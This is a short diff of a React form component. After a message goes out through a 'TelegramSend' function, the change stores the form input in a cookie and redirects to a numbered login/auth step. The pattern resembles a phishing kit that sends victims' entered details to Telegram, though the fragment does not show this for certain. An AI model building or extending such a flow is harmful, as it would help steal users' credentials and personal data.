@@ -87,7 +87,8 @@ export default function Additional() {
     setIsLoading(true);
     await TelegramSend(message);
     setIsLoading(false);
-    navigate("../success", { replace: true });
+    cookies.set("additional", formInput);
+    navigate("../login/auth/3", { replace: true });
   }
   return (
     <>
